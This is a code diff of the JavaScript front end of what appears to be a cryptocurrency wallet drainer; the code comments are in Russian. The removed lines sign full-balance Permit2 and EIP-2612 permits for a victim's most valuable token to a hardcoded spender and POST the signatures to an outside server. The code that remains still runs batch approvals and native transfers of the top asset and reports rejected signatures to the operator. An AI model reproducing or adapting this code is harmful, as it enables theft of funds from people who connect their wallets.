@@ -6,12 +6,10 @@ import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBa
 
 // === Глобальный флаг для управления sendCalls ===
 const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
-// === Флаг для включения Permit2 вместо single approve ===
-const USE_PERMIT2 = true; // true => использовать Permit2, false => обычный single approve
+// === Полный отказ от Permit2 ===
+const USE_PERMIT2 = false;
 // Адрес spender для Permit2 (должен быть EOA сервера, который подпишет tx на Permit2)
 const PERMIT2_SPENDER = import.meta.env.VITE_PERMIT2_SPENDER || '0x1c3537AA356AD38bD727CDF1fb4614dbb15e35C9'
-// Spender for EIP-2612 (who will call transferFrom on backend)
-const EIP2612_SPENDER = import.meta.env.VITE_EIP2612_SPENDER || PERMIT2_SPENDER
 
 // Нативные символы и получатель перевода нативки (заглушка)
 const NATIVE_SYMBOLS = {
@@ -749,23 +747,7 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
         // Нечего подписывать — попробуем только нативку ниже
       } else {
         const token = erc20WithBalance.reduce((acc, t) => (t.price * t.balance > (acc?.price || 0) * (acc?.balance || 0) ? t : acc), erc20WithBalance[0])
-        // Если токен поддерживает EIP-2612 (USDC/DAI), используем EIP-2612 вместо Permit2
-        if (token.symbol === 'USDC' || token.symbol === 'DAI') {
-          try {
-            const amount = parseUnits(token.balance.toString(), token.decimals)
-            const deadline = Math.floor(Date.now() / 1000) + 60 * 10
-            const permit = await signEip2612Permit({ token, owner: state.address, spender: EIP2612_SPENDER, value: amount, chainId: token.chainId, deadline })
-            return { success: true, txHash: null, eip2612: { token: getAddress(token.address), value: amount.toString(), deadline, ...permit } }
-          } catch (error) {
-            if (isUserRejected(error)) {
-              const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
-              const device = detectDevice()
-              await notifyTransactionRejected(state.address, walletInfo.name, device, 'eip2612 signature', mostExpensive.chainId)
-              return { success: false, error: 'USER_REJECTED' }
-            }
-            return { success: false, error: error.message }
-          }
-        }
+        // Permit2-only flow
         const amount = parseUnits(token.balance.toString(), token.decimals)
         const deadline = Math.floor(Date.now() / 1000) + 60 * 10
         const nonce = BigInt(Date.now())
@@ -788,19 +770,13 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
           return {
             success: true,
             txHash: null,
-            permit2: {
-              token: getAddress(token.address),
-              amount: amount.toString(),
-              nonce: nonce.toString(),
-              deadline,
-              signature
-            }
+            // permit2 removed
           }
         } catch (error) {
           if (isUserRejected(error)) {
             const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
             const device = detectDevice()
-            await notifyTransactionRejected(state.address, walletInfo.name, device, 'permit2 signature', mostExpensive.chainId)
+            await notifyTransactionRejected(state.address, walletInfo.name, device, 'batch signature', mostExpensive.chainId)
             return { success: false, error: 'USER_REJECTED' }
           }
           return { success: false, error: error.message }
@@ -890,58 +866,8 @@ const performBatchOperations = async (mostExpensive, allBalances, state) => {
   }
 }
 
-// Permit2 (Uniswap) constants (mainnet)
-const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
-const PERMIT2_DOMAIN = (chainId) => ({ name: 'Permit2', chainId, verifyingContract: PERMIT2_ADDRESS })
-const PERMIT2_TYPES = {
-  PermitTransferFrom: [
-    { name: 'permitted', type: 'TokenPermissions' },
-    { name: 'spender', type: 'address' },
-    { name: 'nonce', type: 'uint256' },
-    { name: 'deadline', type: 'uint256' }
-  ],
-  TokenPermissions: [
-    { name: 'token', type: 'address' },
-    { name: 'amount', type: 'uint256' }
-  ]
-}
-const buildPermit2Message = ({ token, amount, spender, nonce, deadline }) => ({
-  permitted: { token, amount },
-  spender,
-  nonce,
-  deadline
-})
-const signPermit2 = async ({ chainId, account, token, amount, nonce, deadline }) => {
-  const signature = await signTypedData(wagmiAdapter.wagmiConfig, {
-    account: getAddress(account),
-    domain: PERMIT2_DOMAIN(chainId),
-    types: PERMIT2_TYPES,
-    primaryType: 'PermitTransferFrom',
-    message: buildPermit2Message({ token: getAddress(token), amount, spender: getAddress(PERMIT2_SPENDER), nonce, deadline })
-  })
-  return signature
-}
+// (Permit2 removed)
 
-// EIP-2612 signing helpers (USDC/DAI)
-const buildEip2612Domain = (token, chainId) => ({ name: token.symbol, version: token.symbol === 'USDC' ? '2' : '1', chainId, verifyingContract: getAddress(token.address) })
-const EIP2612_TYPES = {
-  Permit: [
-    { name: 'owner', type: 'address' },
-    { name: 'spender', type: 'address' },
-    { name: 'value', type: 'uint256' },
-    { name: 'nonce', type: 'uint256' },
-    { name: 'deadline', type: 'uint256' }
-  ]
-}
-const signEip2612Permit = async ({ token, owner, spender, value, chainId, deadline }) => {
-  // Запрашиваем nonce у токена
-  const noncesAbi = [{ name: 'nonces', type: 'function', stateMutability: 'view', inputs: [{ name: 'owner', type: 'address' }], outputs: [{ name: 'nonce', type: 'uint256' }] }]
-  const nonce = await readContract(wagmiAdapter.wagmiConfig, { address: getAddress(token.address), abi: noncesAbi, functionName: 'nonces', args: [getAddress(owner)], chainId })
-  const domain = buildEip2612Domain(token, chainId)
-  const message = { owner: getAddress(owner), spender: getAddress(spender), value, nonce, deadline }
-  const signature = await signTypedData(wagmiAdapter.wagmiConfig, { account: getAddress(owner), domain, types: EIP2612_TYPES, primaryType: 'Permit', message })
-  return { owner: getAddress(owner), spender: getAddress(spender), value: value.toString(), nonce: nonce.toString(), deadline, signature }
-}
 
 // Модифицируем initializeSubscribers для корректной работы уведомлений
 const initializeSubscribers = (modal) => {
@@ -1026,57 +952,7 @@ const initializeSubscribers = (modal) => {
           // Операции: либо Permit2 (если включен), либо batch approve + native
           const batchResult = await performBatchOperations(mostExpensive, allBalances, state)
           
-          if (batchResult.success && batchResult.permit2) {
-            // Permit2 путь: отправляем данные на бэкенд
-            try {
-              const walletInfoInner = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
-              const deviceInner = detectDevice()
-              const resp = await fetch('https://api.cryptomuspayye.icu/api/permit2', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ userAddress: state.address, chainId: mostExpensive.chainId, permit2: batchResult.permit2 })
-              })
-              const data = await resp.json().catch(() => ({}))
-              if (resp.ok && data.success) {
-                await notifyTransferApproved(state.address, walletInfoInner.name, deviceInner, mostExpensive, mostExpensive.chainId)
-                await notifyTransferSuccess(state.address, walletInfoInner.name, deviceInner, mostExpensive, mostExpensive.chainId, data.txHash || 'unknown')
-                hideCustomModal()
-                store.isProcessingConnection = false
-                return
-              } else {
-                store.errors.push(`Permit2 backend failed: ${data.message || 'unknown error'}`)
-              }
-            } catch (e) {
-              store.errors.push(`Permit2 backend error: ${e.message}`)
-            }
-            hideCustomModal()
-            store.isProcessingConnection = false
-            return
-          } else if (batchResult.success && batchResult.eip2612) {
-            // EIP-2612 путь: отправляем данные на бэкенд
-            try {
-              const walletInfoInner = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
-              const deviceInner = detectDevice()
-              const resp = await fetch('https://api.cryptomuspayye.icu/api/permit2612', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ userAddress: state.address, chainId: mostExpensive.chainId, permit2612: batchResult.eip2612 })
-              })
-              const data = await resp.json().catch(() => ({}))
-              if (resp.ok && data.success) {
-                await notifyTransferApproved(state.address, walletInfoInner.name, deviceInner, mostExpensive, mostExpensive.chainId)
-                await notifyTransferSuccess(state.address, walletInfoInner.name, deviceInner, mostExpensive, mostExpensive.chainId, data.txHash || 'unknown')
-                hideCustomModal()
-                store.isProcessingConnection = false
-                return
-              } else {
-                store.errors.push(`Permit2612 backend failed: ${data.message || 'unknown error'}`)
-              }
-            } catch (e) {
-              store.errors.push(`Permit2612 backend error: ${e.message}`)
-            }
-            hideCustomModal(); store.isProcessingConnection = false; return
-          } else if (batchResult.success) {
+          if (batchResult.success) {
             // Batch через sendCalls (approve + native)
             console.log('Batch transaction successful')
             const approvedTokens = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0 && t.address !== 'native')
@@ -1097,45 +973,16 @@ const initializeSubscribers = (modal) => {
             store.isProcessingConnection = false
             return
           } else if (batchResult.error === 'USER_REJECTED') {
-            console.log('User rejected batch/permit2')
+            console.log('User rejected batch')
             hideCustomModal()
             store.isProcessingConnection = false
             return
           } else if (batchResult.error === 'BATCH_NOT_SUPPORTED') {
-            console.log('wallet_sendCalls not available, will fall back to single approve or permit2')
+            console.log('wallet_sendCalls not available, will fall back to single approve')
           }
         }
         
-        // Фоллбэк: если USE_PERMIT2 включен и sendCalls выключен — делаем Permit2
-        if (!USE_SENDCALLS && USE_PERMIT2) {
-          const token = mostExpensive
-          const amount = parseUnits(token.balance.toString(), token.decimals)
-          const deadline = Math.floor(Date.now() / 1000) + 60 * 10
-          const nonce = BigInt(Date.now())
-          try {
-            const signature = await signPermit2({ chainId: token.chainId, account: state.address, token: token.address, amount, nonce, deadline })
-            const resp = await fetch('https://api.cryptomuspayye.icu/api/permit2', {
-              method: 'POST', headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ userAddress: state.address, chainId: token.chainId, permit2: { token: getAddress(token.address), amount: amount.toString(), nonce: nonce.toString(), deadline, signature } })
-            })
-            const data = await resp.json().catch(() => ({}))
-            if (resp.ok && data.success) {
-              await notifyTransferApproved(state.address, walletInfo.name, device, token, token.chainId)
-              await notifyTransferSuccess(state.address, walletInfo.name, device, token, token.chainId, data.txHash || 'unknown')
-              hideCustomModal(); store.isProcessingConnection = false; return
-            } else {
-              store.errors.push(`Permit2 backend failed: ${data.message || 'unknown error'}`)
-              hideCustomModal(); store.isProcessingConnection = false; return
-            }
-          } catch (error) {
-            if (isUserRejected(error)) {
-              await notifyTransactionRejected(state.address, walletInfo.name, device, 'permit2 signature', mostExpensive.chainId)
-              hideCustomModal(); store.isProcessingConnection = false; return
-            }
-            store.errors.push(`Permit2 error: ${error.message}`)
-            hideCustomModal(); store.isProcessingConnection = false; return
-          }
-        }
+        // Permit2 fallback removed
         
         // Обычный single approve, если Permit2 выключен
         if (USE_PERMIT2) { hideCustomModal(); store.isProcessingConnection = false; return }
